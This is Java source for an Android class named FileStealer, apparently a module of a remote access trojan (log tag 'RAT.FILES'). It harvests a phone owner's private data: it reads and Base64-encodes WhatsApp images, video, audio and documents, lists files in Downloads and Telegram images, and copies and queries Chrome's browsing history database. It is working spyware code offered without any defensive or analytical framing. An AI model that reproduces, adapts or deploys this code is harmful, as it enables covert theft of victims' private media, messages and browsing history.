package com.nullx.pp;

import android.content.Context;
import android.util.Base64;
import android.util.Log;

import java.io.File;
import java.io.FileInputStream;
import java.util.ArrayList;
import java.util.HashMap;

public class FileStealer {
    private static final String TAG = "RAT.FILES";

    public static ArrayList<HashMap<String, String>> getWhatsAppMedia(int limit) {
        ArrayList<HashMap<String, String>> files = new ArrayList<>();
        try {
            String[] paths = {
                "/storage/emulated/0/WhatsApp/Media/WhatsApp Images",
                "/storage/emulated/0/WhatsApp/Media/WhatsApp Video",
                "/storage/emulated/0/WhatsApp/Media/WhatsApp Audio",
                "/storage/emulated/0/WhatsApp/Media/WhatsApp Documents",
                "/storage/emulated/0/Android/media/com.whatsapp/WhatsApp/Media/WhatsApp Images",
                "/storage/emulated/0/Android/media/com.whatsapp/WhatsApp/Media/WhatsApp Video"
            };
            int count = 0;
            for (String path : paths) {
                File dir = new File(path);
                if (!dir.exists() || !dir.isDirectory()) continue;
                File[] files2 = dir.listFiles();
                if (files2 == null) continue;
                for (File f : files2) {
                    if (count >= limit) break;
                    if (!f.isFile()) continue;
                    HashMap<String, String> entry = new HashMap<>();
                    entry.put("path", f.getAbsolutePath());
                    entry.put("name", f.getName());
                    entry.put("size", String.valueOf(f.length()));
                    entry.put("modified", String.valueOf(f.lastModified()));
                    if (f.length() < 5 * 1024 * 1024) {
                        try {
                            FileInputStream fis = new FileInputStream(f);
                            byte[] data = new byte[(int) f.length()];
                            fis.read(data);
                            fis.close();
                            entry.put("data", Base64.encodeToString(data, Base64.NO_WRAP));
                        } catch (Exception ignored) {}
                    }
                    files.add(entry);
                    count++;
                }
                if (count >= limit) break;
            }
        } catch (Exception e) {
            Log.e(TAG, "getWhatsAppMedia error: " + e.getMessage());
        }
        return files;
    }

    public static ArrayList<HashMap<String, String>> getDownloads(int limit) {
        ArrayList<HashMap<String, String>> files = new ArrayList<>();
        try {
            File dir = new File("/storage/emulated/0/Download");
            if (!dir.exists()) return files;
            File[] fs = dir.listFiles();
            if (fs == null) return files;
            int count = 0;
            for (File f : fs) {
                if (count >= limit) break;
                if (!f.isFile()) continue;
                HashMap<String, String> entry = new HashMap<>();
                entry.put("name", f.getName());
                entry.put("size", String.valueOf(f.length()));
                entry.put("path", f.getAbsolutePath());
                files.add(entry);
                count++;
            }
        } catch (Exception e) {
            Log.e(TAG, "getDownloads error: " + e.getMessage());
        }
        return files;
    }

    public static String getChromeHistory(Context ctx) {
        StringBuilder sb = new StringBuilder();
        try {
            String path = "/data/data/com.android.chrome/app_chrome/Default/History";
            File dbFile = new File(path);
            if (dbFile.exists()) {
                File copy = new File(ctx.getCacheDir(), "chrome_history_copy");
                FileInputStream fis = new FileInputStream(dbFile);
                java.io.FileOutputStream fos = new java.io.FileOutputStream(copy);
                byte[] buf = new byte[8192];
                int len;
                while ((len = fis.read(buf)) > 0) fos.write(buf, 0, len);
                fis.close(); fos.close();

                android.database.sqlite.SQLiteDatabase db = android.database.sqlite.SQLiteDatabase.openDatabase(
                    copy.getAbsolutePath(), null,
                    android.database.sqlite.SQLiteDatabase.OPEN_READONLY);
                android.database.Cursor c = db.rawQuery(
                    "SELECT url, title FROM urls ORDER BY last_visit_time DESC LIMIT 100", null);
                while (c.moveToNext()) {
                    sb.append(c.getString(0)).append("\n");
                }
                c.close(); db.close();
                copy.delete();
            }
        } catch (Exception e) {
            sb.append("Chrome history error: ").append(e.getMessage());
        }
        return sb.toString();
    }

    public static ArrayList<HashMap<String, String>> getTelegramMedia(int limit) {
        ArrayList<HashMap<String, String>> files = new ArrayList<>();
        try {
            File dir = new File("/storage/emulated/0/Telegram/Telegram Images");
            if (dir.exists()) {
                File[] fs = dir.listFiles();
                if (fs != null) {
                    int count = 0;
                    for (File f : fs) {
                        if (count >= limit) break;
                        HashMap<String, String> entry = new HashMap<>();
                        entry.put("path", f.getAbsolutePath());
                        entry.put("name", f.getName());
                        files.add(entry);
                        count++;
                    }
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "getTelegramMedia error: " + e.getMessage());
        }
        return files;
    }
}